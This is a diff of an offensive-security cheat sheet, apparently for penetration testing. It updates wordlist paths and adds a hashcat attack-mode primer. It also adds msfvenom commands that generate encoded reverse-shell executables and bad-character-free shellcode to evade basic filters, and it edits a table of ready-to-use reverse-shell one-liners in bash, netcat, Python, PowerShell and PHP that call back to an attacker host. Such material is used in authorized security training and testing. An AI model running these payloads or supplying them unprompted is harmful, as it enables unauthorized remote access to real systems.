@@ -200,11 +200,10 @@ ffuf -u http://<target>/login -X POST \
 
 ### Passwords
 ```
-/usr/share/seclists/Passwords/rockyou.txt                     # (gunzip -k /usr/share/wordlists/rockyou.txt.gz on Kali)
 /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top1000.txt
 /usr/share/seclists/Passwords/Common-Credentials/best1050.txt
 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
-/usr/share/seclists/Passwords/probable-v2-top1575.txt
+/usr/share/seclists/Passwords/Common-Credentials/probable-v2-top1575.txt
 /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt
 ```
 
@@ -252,6 +251,16 @@ gunzip /usr/share/wordlists/rockyou.txt.gz    # extracts to /usr/share/wordlists
 | Django (PBKDF2-SHA256)               | 10000     | |
 | Oracle 11g                           | 112       | |
 | Wordpress (phpass)                   | 400       | |
+
+### `-a` Attack Mode Primer
+```
+-a 0   Straight (wordlist)                    hashcat -m 0 hash.txt wordlist.txt
+-a 1   Combinator (wordlist1 x wordlist2)      hashcat -m 0 hash.txt wordlist1.txt wordlist2.txt
+-a 3   Brute-force / mask                      hashcat -m 0 hash.txt ?d?d?d?d?d?d?d?d
+-a 6   Hybrid wordlist + mask (append)         hashcat -m 0 hash.txt wordlist.txt ?d?d     (e.g. password + 2 digits)
+-a 7   Hybrid mask + wordlist (prepend)        hashcat -m 0 hash.txt ?d?d wordlist.txt
+```
+Mask charsets: `?l` lower, `?u` upper, `?d` digit, `?s` special, `?a` all.
 
 ### Common hashcat invocation patterns
 ```bash
@@ -318,11 +327,23 @@ msfvenom -p cmd/unix/reverse_bash LHOST=<attacker_ip> LPORT=443 -f raw -o shell.
 
 ### Encoded / staged options (bypass basic filters)
 ```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 \
+msfvenom -p windows/x86/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 \
   -e x86/shikata_ga_nai -i 5 -f exe -o shell_enc.exe
+
+# x64 payload requires an x64-compatible encoder (shikata_ga_nai is x86-only)
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 \
+  -e x64/xor_dynamic -i 5 -f exe -o shell_enc_x64.exe
 
 # Common -f formats: exe, elf, raw, war, asp, aspx, jsp, psh (powershell), dll, macho
 ```
+
+### Raw shellcode for BOF/exploit-dev (bad-char avoidance)
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 \
+  -b '\x00\x0a\x0d' -f c -o shellcode.txt
+```
+- `-b '<bad chars>'` excludes bytes that break the target's input handling (e.g. `\x00\x0a\x0d`) — determine the full bad-char list first with a `\x00-\xff` bytearray send + response comparison before generating final shellcode.
+- `-f c` (or `-f python`/`-f raw`) for pasting into an exploit script rather than a standalone binary.
 
 ---
 
@@ -334,7 +355,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 \
 | **Bash (alt)** | `0<&196;exec 196<>/dev/tcp/<attacker_ip>/<port>; sh <&196 >&196 2>&196` |
 | **Netcat (classic)** | `nc -e /bin/sh <attacker_ip> <port>` |
 | **Netcat (no -e)** | `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/sh -i 2>&1 \| nc <attacker_ip> <port> >/tmp/f` |
-| **Netcat (OpenBSD, -c)** | `nc -c /bin/sh <attacker_ip> <port>` |
+| **Netcat (traditional/GNU, -e)** | `nc.traditional -e /bin/sh <attacker_ip> <port>` (OpenBSD `nc`, the Kali/Debian default, strips `-e`/`-c` execution support — use `nc.traditional` or `ncat --exec /bin/sh <attacker_ip> <port>` instead) |
 | **Python3** | `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'` |
 | **PowerShell** | `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` |
 | **PHP** | `php -r '$sock=fsockopen("<attacker_ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'` |
@@ -363,7 +384,7 @@ Once `nmap -sV` (or banner grabbing) gives you a product and version string, fee
 
 | Tool / Site | Type | Query pattern | Notes |
 |---|---|---|---|
-| **searchsploit** (offline Exploit-DB mirror, ships with Kali) | CLI | `searchsploit wordpress 4.7` | Fastest first check, no network needed; `-w` prints the online exploit-db.com URL, `-m <id>` copies a PoC locally |
+| **searchsploit** (offline Exploit-DB mirror, ships with Kali) | CLI | `searchsploit wordpress 4.7` | Fastest first check, no network needed; `-w` prints the online exploit-db.com URL, `-m <id>` copies a PoC locally; `searchsploit --nmap nmap-full.xml` (requires `-oX`/`-oA` nmap XML output) auto-cross-references every detected service/version in one shot |
 | [Exploit-DB](https://www.exploit-db.com/search) | Web | Product + version filter fields | Canonical source `searchsploit` mirrors; check here if the local DB is stale |
 | [vulners.com](https://vulners.com/) | Web + API | `wordpress 4.7` in the search bar | Aggregates NVD/CVE + vendor advisories + exploit refs in one result list; backs the `nmap-vulners` NSE script above |
 | [cvedetails.com version search](https://www.cvedetails.com/version-search.php) | Web | Vendor / product / version dropdowns | Best when you know exact vendor+product; supports one trailing wildcard (e.g. `4.7*`); results cap at 100 per query so add the version to narrow a popular product |
